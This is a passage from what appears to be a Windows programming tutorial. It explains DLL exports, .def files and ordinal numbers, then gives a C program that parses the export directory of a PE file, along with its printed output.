font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>e.def<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>LIBRARY e.dll<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>EXPORTS<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>xyz @5<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>aaa @7<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>bbb @12<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>cl –c e.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>link /dll /def:e.def e.obj<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The above program continues with what
we are learning about the structure of a PE file. In file e.c, there are six
functions namely abc, pqr, xyz, aaa , bbb and ccc. These six functions would be
placed in a dll, but only five of them would be allowed access by other code.
By default, code in dll is not exposed to the outside world. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>There are, as always, two ways of
giving permission to access code present in the dll. The first approach is by
tagging the functions with the keyword __declspec alongwith the option
dllexport. The first two functions abc and pqr are exported in this way. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The second alternative is by using a
definitions (.def) file. A def file has a certain format, which is clearly seen
in file e.def. It starts with the reserved word Library and then the library
name. If the name of the library is changed to e1.dll, the linker names the dll
as e1.dll. Then the keyword EXPORTS is specified followed by a list of
functions that are exported. Thereafter, the function names, i.e. xyz, aaa and
bbb are given. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The exported function of a dll can be
called using the Win32 API. The API either takes name of the function or its
ordinal number. This number is given after an @ following the name of the
function. Normally using an ordinal number is not advisable as it may vary from
one version of the dll to the other. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The function xyz is given an ordinal
number of<span style="mso-spacerun: yes">  </span>5 followed by an ordinal
number of 7 for the function aaa and 12 for bbb. If the ordinal number is not
specified, the system chooses a default beginning with 1 and then increasing it
sequentially. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The indentation is there for display
purposes only; most def files indent the function name also.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The exported functions in a dll are placed
in the exports section along with its location in the dll. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The program given below, displays the
exports data in the file e.dll.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;time.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;e.dll&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;pmappedfile=%p\n&quot;,pmappedfile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER *pimagefileheader =
(IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char
*)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>PIMAGE_SECTION_HEADER psectionheader;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>psectionheader =
(PIMAGE_SECTION_HEADER)((char *)pimageoptionalheader +
sizeof(IMAGE_OPTIONAL_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD
beginexportsrva,endexportsrva,diff,startoffile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>beginexportsrva =
pimageoptionalheader-&gt;DataDirectory[0].VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>endexportsrva = beginexportsrva +
pimageoptionalheader-&gt;DataDirectory[0].Size;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;beginexportsrva=%p
Size=%x endexportsrva=%p\n&quot;,beginexportsrva,pimageoptionalheader-&gt;DataDirectory[0].Size,endexportsrva);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Sec No Name<span
style="mso-spacerun: yes">     </span>Virtual Address PointerToRawData
VirtualSize\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( i=0; i &lt;
pimagefileheader-&gt;NumberOfSections; i++, psectionheader++ )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%d<span
style="mso-spacerun: yes">      </span>%6s<span style="mso-spacerun: yes">  
</span>%x<span style="mso-spacerun: yes">            </span>%x<span
style="mso-spacerun: yes">                 </span>%x\n&quot;,i,psectionheader-&gt;Name,psectionheader-&gt;VirtualAddress,psectionheader-&gt;PointerToRawData,psectionheader-&gt;Misc.VirtualSize);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( (beginexportsrva &gt;=
psectionheader-&gt;VirtualAddress) &amp;&amp; (endexportsrva &lt;=
(psectionheader-&gt;VirtualAddress + psectionheader-&gt;Misc.VirtualSize)))<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>diff =
(INT)(psectionheader-&gt;VirtualAddress - psectionheader-&gt;PointerToRawData);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;diff=%d
%x\n&quot;,diff,diff);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>PIMAGE_EXPORT_DIRECTORY
pexportdirectory;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>startoffile = (DWORD)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pexportdirectory =
(PIMAGE_EXPORT_DIRECTORY)(startoffile + beginexportsrva - diff);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;pexportdirectory=%p\n&quot;,pexportdirectory);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>char *nameoffile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>nameoffile<span style="mso-spacerun:
yes">  </span>= (PSTR)(pexportdirectory-&gt;Name - diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;FileName:%s %x\n&quot;,
nameoffile,nameoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Characteristics:%08X\n&quot;,
pexportdirectory-&gt;Characteristics);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;TimeDateStamp:%08X
%s&quot;,pexportdirectory-&gt;TimeDateStamp,ctime((long
*)&amp;pexportdirectory-&gt;TimeDateStamp));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Version
Number:Major.Minor %u.%02u\n&quot;,
pexportdirectory-&gt;MajorVersion,pexportdirectory-&gt;MinorVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Ordinal Numbers Starting
From:%08X\n&quot;, pexportdirectory-&gt;Base);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Number of
functions:%08X\n&quot;, pexportdirectory-&gt;NumberOfFunctions);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Number of
Names:%08X\n&quot;, pexportdirectory-&gt;NumberOfNames);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Address of functions array
rva=%08x\n&quot;,pexportdirectory-&gt;AddressOfFunctions);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Address of names array
rva=%08x\n&quot;,pexportdirectory-&gt;AddressOfNames);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Address of ordinals
array rva=%08x\n&quot;,pexportdirectory-&gt;AddressOfNameOrdinals);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>long *pfunctionsactual;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>short *pordinalsactual;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pfunctionsactual = (long
*)((int)pexportdirectory-&gt;AddressOfFunctions - diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pordinalsactual<span
style="mso-spacerun: yes">  </span>= (short
*)((int)pexportdirectory-&gt;AddressOfNameOrdinals - diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>char **ppnamesactual;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>ppnamesactual = (char<span
style="mso-spacerun: yes">  </span>**)((int)pexportdirectory-&gt;AddressOfNames
- diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;\ni<span
style="mso-spacerun: yes">  </span>Entry Pt<span style="mso-spacerun: yes"> 
</span>Ordn<span style="mso-spacerun: yes">  </span>Name\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( i=0; i &lt;
pexportdirectory-&gt;NumberOfFunctions; i++ )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD startoffunctionsrva =
pfunctionsactual[i];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD j;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( startoffunctionsrva == 0 )<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>continue;<span style="mso-spacerun:
yes">   </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%d<span
style="mso-spacerun: yes">  </span>%08X<span style="mso-spacerun: yes"> 
</span>%4u&quot;, i , startoffunctionsrva, i + pexportdirectory-&gt;Base ); <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( j=0; j &lt;
pexportdirectory-&gt;NumberOfNames; j++ )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( pordinalsactual[j] == i )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;<span
style="mso-spacerun: yes">  </span>%s&quot;, ppnamesactual[j] - diff +
startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( (startoffunctionsrva &gt;=
beginexportsrva) &amp;&amp; (startoffunctionsrva &lt;= endexportsrva) )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot; (forwarder -&gt;
%s)&quot;, startoffunctionsrva - diff + startoffile );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Array of Address of
Functions\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( i = 0 ; i &lt;
pexportdirectory-&gt;NumberOfFunctions; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%d
%08X\n&quot;,i,pfunctionsactual[i]);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Array of
NameOrdinals\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( i = 0 ; i &lt;
pexportdirectory-&gt;NumberOfNames; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%d
%08X\n&quot;,i,pordinalsactual[i]);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Names of
functions\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( i = 0 ; i &lt;
pexportdirectory-&gt;NumberOfNames; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%d %08X
%s\n&quot;,i,ppnamesactual[i] - diff + startoffile , ppnamesactual[i] - diff +
startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile=00310000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>beginexportsrva=00004710 Size=80
endexportsrva=00004790<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Sec No Name<span style="mso-spacerun:
yes">     </span>Virtual Address PointerToRawData VirtualSize<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>0<span style="mso-spacerun:
yes">       </span>.text<span style="mso-spacerun: yes">   </span>1000<span
style="mso-spacerun: yes">            </span>1000<span style="mso-spacerun:
yes">                 </span>275e<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>1<span style="mso-spacerun:
yes">      </span>.rdata<span style="mso-spacerun: yes">   </span>4000<span
style="mso-spacerun: yes">            </span>4000<span style="mso-spacerun:
yes">                 </span>790<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>diff=0 0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pexportdirectory=00424710<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>FileName:e.dll 424776<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Characteristics:00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>TimeDateStamp:3FEBF2B2 Fri Dec 26
14:04:58 2003<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Version Number:Major.Minor 0.00<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Ordinal Numbers Starting
From:00000005<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Number of functions:00000008<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Number of Names:00000005<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Address of functions array
rva=00004738<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Address of names array rva=00004758<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Address of ordinals array
rva=0000476c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>i<span style="mso-spacerun: yes"> 
</span>Entry Pt<span style="mso-spacerun: yes">  </span>Ordn<span
style="mso-spacerun: yes">  </span>Name<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>0 <span style="mso-spacerun:
yes"> </span>0000100A<span style="mso-spacerun: yes">     </span>5<span
style="mso-spacerun: yes">  </span>xyz<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>1<span style="mso-spacerun: yes"> 
</span>00001000<span style="mso-spacerun: yes">     </span>6<span
style="mso-spacerun: yes">  </span>abc<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>2<span style="mso-spacerun: yes"> 
</span>0000100F<span style="mso-spacerun: yes">     </span>7<span
style="mso-spacerun: yes">  </span>aaa<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>3<span style="mso-spacerun: yes"> 
</span>00001005<span style="mso-spacerun: yes">     </span>8<span
style="mso-spacerun: yes">  </span>pqr<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>7<span style="mso-spacerun: yes"> 
</span>00001014<span style="mso-spacerun: yes">    </span>12<span
style="mso-spacerun: yes">  </span>bbb<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Array of Address of Functions<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>0 0000100A<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>1 00001000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>2 0000100F<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>3 00001005<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>4 00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>5 00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>6 00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>7 00001014<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Array of NameOrdinals<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>0 00000002<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>1 00000001<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>2 00000007<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>3 00000003<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>4 00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Names of functions<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
